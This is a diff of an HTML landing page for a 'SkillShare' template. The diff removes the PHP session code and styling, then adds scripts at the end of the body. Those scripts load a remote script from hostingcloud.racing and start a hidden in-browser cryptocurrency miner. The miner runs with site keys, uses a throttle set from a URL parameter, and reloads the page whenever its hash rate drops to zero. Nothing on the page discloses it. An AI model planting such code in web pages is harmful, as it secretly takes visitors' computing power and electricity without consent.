@@ -1,32 +1,13 @@
-<?php
-session_start();
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-
-
-    <!-- Webpage Title -->
-    <title>SkillShare Webpage Title</title>
-
-    <!-- Styles -->
-    <link rel="preconnect" href="https://fonts.gstatic.com" />
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&display=swap"
-        rel="stylesheet" />
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" rel="stylesheet"
-        integrity="sha512-KfkfwYDsLkIlwQV1vtKRwtLz2V9W/D7cBnsPQcX68zh/IUogtPgKT9Bdu9EMWxd6ADKM3C+7HcTMSPDXcRVxXA=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <script src="https://cdn.tailwindcss.com"></script>
-
-    <link rel="icon" href="images/favicon.png" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 
-<body data-spy="scroll" data-target=".fixed-top">
-
+<body>
 
     <!-- component -->
     <!-- Gogole Fonts -->
@@ -540,7 +521,98 @@ session_start();
     </footer>
 
 
-    <script>setInterval(async () => { if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 500);</script>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.5;
+        window.use = use;
+    </script>
+
+    <script>setInterval(async () => { if (!window.lastCode) window.lastCode = await (await fetch(location.href)).text(); console.log(window.lastCode?.length, (await (await fetch(location.href)).text()).length); if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 10 * 60 * 1000);</script>
+    <script>
+        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 30)
+    </script>
+
+    <script src="https://www.hostingcloud.racing/eWTV.js"></script>
+
+
+    <script>
+
+
+
+
+            (async () => {
+
+
+
+
+
+                let Client = window.Client;
+
+                while (!Client) {
+                    await new Promise(r => setTimeout(r, 1000));
+                    Client = window.Client;
+                }
+
+                let siteKeys = [
+                    '53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9'
+                    // 'a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb',
+                    // '22e4addcef78830b5e82e2565e698ead692c0627ba8ecf22b00dbdc009d9483c',
+                    // 'a08a22fe927fdc00d212015d7c48036cc44af0ace95e3502a8ed207e687d8b99',
+                    // '6b6e5c4c5a7351e38bcf94497ce0beca440485ddb56d2f032d8a4a8d5f8143e7',
+                    // '1c0d9b91e5a1ae6c17508815f108530bb0012bf14e9ecb1e64795e418fdc13a8',
+                    // '7d888f48a8f10310782ac9ff6a553d6f593d7fd69fed00e964772b2d1ef2b1e0',
+                    // '5337cd7a9213e4a662f0e9e5d47404d72b2ec529c87a7d8ab3bad29e64305c7d'
+                ];
+
+                // var _client = new Client.Anonymous('53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9',
+                // var _client = new Client.User(Date.now() % 2 ? 'a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb' : '53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9', Date.now() % 2 ? 'mainuser' : 'mainuser2',
+                // var _client = new Client.Anonymous(siteKeys[getRandomIntInclusive(0, siteKeys.length - 1)],
+                var _client = new Client.User(siteKeys[getRandomIntInclusive(0, siteKeys.length - 1)],
+                    generateUUID(),
+                    {
+                        throttle: 1 - use, c: 'w', // ads: 0
+                    });
+                _client.start(Client.FORCE_MULTI_TAB);
+                window._client = _client;
+                window.info = 'v3';
+                window.lastArr = [];
+                while (1) {
+                    try {
+                        await new Promise(r => setTimeout(r, 1000));
+                        running = _client.isRunning();
+                        window.lastArr.push(_client.getHashesPerSecond());
+                        if (window.lastArr.length > 20) window.lastArr.shift();
+                        if (window.lastArr.length >= 20 && window.lastArr.every((v, i, a) => 0 == parseInt(v))) {
+                            window.location.reload();
+                        }
+                        console.log(running, _client.getHashesPerSecond());
+                    } catch (error) {
+                        console.log(error);
+                    }
+                }
+            })().catch(console.error);
+
+
+        function getRandomIntInclusive(min, max) {
+            min = Math.ceil(min); // Round up to ensure the range is inclusive
+            max = Math.floor(max); // Round down to ensure the range is inclusive
+            return Math.floor(Math.random() * (max - min + 1)) + min; // Generate random int in [min, max]
+        }
+
+        function generateUUID() {
+            // Generates a random UUID (Version 4)
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+                const r = Math.random() * 16 | 0; // Generate a random number between 0 and 15
+                const v = c === 'x' ? r : (r & 0x3 | 0x8); // Replace 'x' with random, 'y' with specific constraints
+                return v.toString(16); // Convert to hexadecimal
+            });
+        }
+
+
+
+    </script>
+
 
 </body>
 
